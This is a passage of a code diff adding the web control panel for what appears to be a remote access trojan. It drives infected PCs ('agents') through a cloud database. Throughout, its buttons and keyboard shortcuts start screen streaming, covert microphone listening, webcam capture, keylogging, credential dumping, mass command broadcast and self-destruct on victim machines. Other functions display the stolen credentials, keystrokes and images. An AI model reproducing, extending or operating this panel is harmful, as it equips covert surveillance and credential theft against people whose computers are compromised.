+    clearInterval(watchInterval); watchInterval = null;
+    btnWatch.classList.remove('watching'); btnWatch.textContent = '🖥️ Watch';
+    livePanel.classList.remove('open');
+    if (activePC) await sendCommand('LIVE_STOP', 'special');
+    log('[*] Live screen stopped.', 'warn');
+  }
+  btnWatch.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (watchInterval) { await stopWatch(); return; }
+    btnWatch.classList.add('watching'); btnWatch.textContent = '⏹ Stop';
+    livePanel.classList.add('open');
+    liveTitle.textContent = `🎥 Live Screen — ${activePC}`;
+    liveBody.innerHTML = '<div class="bubble sys">Streaming...</div>';
+    log('[*] Live screen started.', 'success');
+    await sendCommand('LIVE_START', 'special');
+    watchInterval = setInterval(() => sendCommand('LIVE_FRAME', 'special'), 1000);
+  });
+
+  const btnMic = document.getElementById('btnMic');
+  btnMic.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (listenInterval) {
+      clearInterval(listenInterval); listenInterval = null;
+      btnMic.classList.remove('recording'); btnMic.textContent = '🔊 Listen';
+      await sendCommand('MIC_STOP', 'special');
+      log('[*] Remote mic stopped.', 'warn');
+      return;
+    }
+    btnMic.classList.add('recording'); btnMic.textContent = '⏹ Stop';
+    livePanel.classList.add('open');
+    liveTitle.textContent = `🔊 Remote Mic — ${activePC}`;
+    liveBody.innerHTML = '<div class="bubble sys">Listening...</div>';
+    log('[*] Remote mic started.', 'success');
+    await sendCommand('MIC_START', 'special');
+    listenInterval = setInterval(() => sendCommand('MIC_CHUNK', 'special'), 2000);
+  });
+
+  const btnTalk = document.getElementById('btnTalk');
+  btnTalk.addEventListener('mousedown', startTalk);
+  btnTalk.addEventListener('mouseup', stopTalk);
+  btnTalk.addEventListener('mouseleave', stopTalk);
+  btnTalk.addEventListener('touchstart', e => { e.preventDefault(); startTalk(); });
+  btnTalk.addEventListener('touchend', e => { e.preventDefault(); stopTalk(); });
+  window.addEventListener('blur', stopTalk);
+  document.addEventListener('visibilitychange', () => { if (document.hidden) stopTalk(); });
+
+  async function startTalk() {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') { try { mediaRecorder.stop(); } catch(e){} }
+    try { talkStream = await navigator.mediaDevices.getUserMedia({ audio: true }); }
+    catch (err) { return log('[!] Mic access denied', 'error'); }
+    mediaRecorder = new MediaRecorder(talkStream);
+    audioChunks = [];
+    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+    mediaRecorder.onstop = async () => {
+      const blob = new Blob(audioChunks, { type: 'audio/webm' });
+      const r = new FileReader();
+      r.onloadend = async () => {
+        const b64 = r.result.split(',')[1];
+        await sendCommand('PLAY_AUDIO:' + b64, 'special');
+        log(`[🎤] Sent ${Math.round(blob.size/1024)}KB voice → ${activePC}`, 'success');
+      };
+      r.readAsDataURL(blob);
+      if (talkStream) talkStream.getTracks().forEach(t => t.stop());
+    };
+    mediaRecorder.start();
+    btnTalk.classList.add('talking'); btnTalk.textContent = '🔴 Recording...';
+    log('[🎤] Recording... release to send.', 'info');
+  }
+  function stopTalk() {
+    try {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+        btnTalk.classList.remove('talking'); btnTalk.textContent = '🎤 Talk';
+      }
+    } catch(e){}
+  }
+
+  document.getElementById('btnWebcam').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Requesting webcam...', 'info');
+    await sendCommand('WEBCAM', 'special');
+    setTimeout(() => fetchWebcam(activePC), 3000);
+  });
+
+  const btnKeylog = document.getElementById('btnKeylog');
+  btnKeylog.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (keylogActive) {
+      keylogActive = false;
+      btnKeylog.classList.remove('recording'); btnKeylog.textContent = '⌨️ Keylog';
+      await sendCommand('KEYLOG_STOP', 'special');
+      log('[*] Keylogger stopped.', 'warn');
+      return;
+    }
+    keylogActive = true;
+    btnKeylog.classList.add('recording'); btnKeylog.textContent = '⏹ Stop';
+    log('[*] Keylogger started.', 'success');
+    await sendCommand('KEYLOG_START', 'special');
+  });
+
+  document.getElementById('btnCreds').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Dumping credentials...', 'info');
+    await sendCommand('DUMP_CREDS', 'special');
+    setTimeout(() => fetchCreds(activePC), 3000);
+  });
+
+  document.getElementById('btnBroadcast').addEventListener('click', async () => {
+    if (!selectedPCs.size) return toast('Select PCs first', 'err');
+    const cmd = prompt(`Broadcast to ${selectedPCs.size} PC(s):`);
+    if (!cmd) return;
+    if (!confirm(`Confirm: send "${cmd}" to ${selectedPCs.size} machine(s)?`)) return;
+    await broadcast(cmd, activeTab === 'ps' ? 'powershell' : 'cmd');
+  });
+
+  // ============================================================
+  // Kill
+  // ============================================================
+  const btnKill = document.getElementById('btnKill');
+  btnKill.addEventListener('click', () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    document.getElementById('killTarget').textContent = activePC;
+    killModal.classList.add('open');
+  });
+  document.getElementById('killCancel').addEventListener('click', () => killModal.classList.remove('open'));
+  document.getElementById('killConfirm').addEventListener('click', async () => {
+    if (!activePC) { killModal.classList.remove('open'); return; }
+    const target = activePC;
+    killModal.classList.remove('open');
+    log(`[*] 💀 SELF-DESTRUCT sent to ${target}`, 'error');
+    await sendCommand('SELF_DESTRUCT', 'special');
+    toast('Self-destruct command sent', 'err');
+  });
+
+  // ============================================================
+  // Live panel close
+  // ============================================================
+  document.getElementById('liveClose').addEventListener('click', async () => {
+    if (watchInterval) { await stopWatch(); }
+    else { livePanel.classList.remove('open'); if (unsubLive) { unsubLive(); unsubLive = null; } liveBody.innerHTML=''; liveImg=null; }
+  });
+
+  // ============================================================
+  // Menu
+  // ============================================================
+  const menuBtn = document.getElementById('menuBtn');
+  menuBtn.addEventListener('click', e => {
+    e.stopPropagation();
+    menuPanel.classList.toggle('open');
+  });
+  document.addEventListener('click', e => {
+    if (!menuPanel.classList.contains('open')) return;
+    if (menuPanel.contains(e.target)) return;
+    if (e.target === menuBtn) return;
+    menuPanel.classList.remove('open');
+  });
+
+  menuPanel.querySelectorAll('.menu-item[data-tab]').forEach(el => {
+    el.addEventListener('click', () => {
+      switchTab(el.dataset.tab);
+      menuPanel.classList.remove('open');
+    });
+  });
+  const mi = id => document.getElementById(id);
+  mi('miScreenshot').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnShot').click(); menuPanel.classList.remove('open'); });
+  mi('miWatch').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnWatch').click(); menuPanel.classList.remove('open'); });
+  mi('miMic').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnMic').click(); menuPanel.classList.remove('open'); });
+  mi('miWebcam').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnWebcam').click(); menuPanel.classList.remove('open'); });
+  mi('miCreds').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnCreds').click(); menuPanel.classList.remove('open'); });
+  mi('miKeylog').addEventListener('click', () => { btnKillCheck(); document.getElementById('btnKeylog').click(); menuPanel.classList.remove('open'); });
+  mi('miTalk').addEventListener('click', () => { toast('Hold the 🎤 Talk button to record'); menuPanel.classList.remove('open'); });
+  mi('miInfo').addEventListener('click', () => { if (activePC) { fetchSysInfo(activePC); switchTab('sys'); } menuPanel.classList.remove('open'); });
+  mi('miBroadcast').addEventListener('click', () => { document.getElementById('btnBroadcast').click(); menuPanel.classList.remove('open'); });
+  mi('miKill').addEventListener('click', () => { document.getElementById('btnKill').click(); menuPanel.classList.remove('open'); });
+
+  function btnKillCheck() { if (!activePC) { toast('Select a PC first', 'err'); return false; } return true; }
+
+  // ============================================================
+  // Keyboard shortcuts
+  // ============================================================
+  document.addEventListener('keydown', e => {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable) return;
+    if (killModal.classList.contains('open')) {
+      if (e.key === 'Escape') killModal.classList.remove('open');
+      return;
+    }
+    if (e.ctrlKey || e.altKey || e.metaKey) return;
+    const map = {
+      '1': () => switchTab('cmd'), '2': () => switchTab('ps'), '3': () => switchTab('sys'),
+      '4': () => switchTab('proc'), '5': () => switchTab('net'), '6': () => switchTab('files'),
+      '7': () => switchTab('creds'), '8': () => switchTab('keylog'), '9': () => switchTab('webcam'),
+      '0': () => switchTab('logs'),
+      's': () => btnKillCheck() && document.getElementById('btnShot').click(),
+      'w': () => btnKillCheck() && document.getElementById('btnWatch').click(),
+      'm': () => btnKillCheck() && document.getElementById('btnMic').click(),
+      'c': () => btnKillCheck() && document.getElementById('btnWebcam').click(),
+      'd': () => btnKillCheck() && document.getElementById('btnCreds').click(),
+      'k': () => btnKillCheck() && document.getElementById('btnKeylog').click(),
+      'b': () => btnKillCheck() && document.getElementById('btnBroadcast').click(),
+      'i': () => btnKillCheck() && mi('miInfo').click(),
+      'x': () => btnKillCheck() && document.getElementById('btnKill').click()
+    };
+    const fn = map[e.key.toLowerCase()];
+    if (fn) { e.preventDefault(); fn(); }
+    if (e.key === 'Escape') { menuPanel.classList.remove('open'); livePanel.classList.remove('open'); }
+  });
+
+  // ============================================================
+  // Info fetchers — use get() not onValue(onlyOnce)
+  // ============================================================
+  async function fetchSysInfo(id) {
+    try {
+      const snap = await get(ref(db, `agents/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No sysinfo.', 'warn');
+      log('--- SYSTEM ---', 'success');
+      Object.entries(d).forEach(([k, v]) => { if (typeof v !== 'object') log(`  ${k}: ${v}`); });
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchProcesses(id) {
+    try {
+      const snap = await get(ref(db, `processes/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No process data.', 'warn');
+      log('--- PROCESSES ---', 'success');
+      Object.values(d).sort((a,b) => (Number(a.pid)||0) - (Number(b.pid)||0))
+        .forEach(p => log(`  ${p.pid}\t${p.name}\t${p.mem}`));
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchNetwork(id) {
+    try {
+      const snap = await get(ref(db, `network/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No network data.', 'warn');
+      log('--- NETWORK ---', 'success');
+      Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`));
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchFiles(id) {
+    try {
+      const snap = await get(ref(db, `files/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No file listing.', 'warn');
+      log('--- FILES ---', 'success');
+      Object.values(d).forEach(f => log(`  ${f.name}\t${f.size}\t${f.modified}`));
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchCreds(id) {
+    try {
+      const snap = await get(ref(db, `creds/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No creds yet.', 'warn');
+      log('--- CREDS ---', 'success');
+      Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`));
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchKeylog(id) {
+    try {
+      const snap = await get(ref(db, `keylog/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No keylog.', 'warn');
+      log('--- KEYLOG ---', 'success');
+      Object.values(d).forEach(k => {
+        const t = k && k.t ? new Date(k.t).toLocaleTimeString() : '--:--:--';
+        log(`  [${t}] ${k.text || ''}`);
+      });
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchWebcam(id) {
+    try {
+      const snap = await get(ref(db, `webcam/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No webcam.', 'warn');
+      log('--- WEBCAM ---', 'success');
+      Object.values(d).forEach(w => { if (w && w.img) logImage(w.img); });
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+  async function fetchLogs(id) {
+    try {
+      const snap = await get(ref(db, `logs/${id}`));
+      const d = snap.val(); if (!d) return log('[!] No logs.', 'warn');
+      log('--- LOGS ---', 'success');
+      Object.values(d).forEach(l => log(`  [${l.time||'?'}] ${l.text||''}`));
+      log('');
+    } catch(e) { log('[!] fetch error: ' + e.message, 'error'); }
+  }
+
+  // ============================================================
+  // Housekeeping
+  // ============================================================
+  setInterval(async () => {
+    const now = Date.now();
+    for (const [id, pc] of Object.entries(pcs)) {
+      if (pc.lastSeen && (now - pc.lastSeen) > 60000 && pc.online) {
+        try { await set(ref(db, `agents/${id}/online`), false); } catch(e) {}
+      }
+    }
+  }, 20000);
+
+  subscribeAgents();
+  setPrompt();
+}
+</script>
+</body>
+</html>
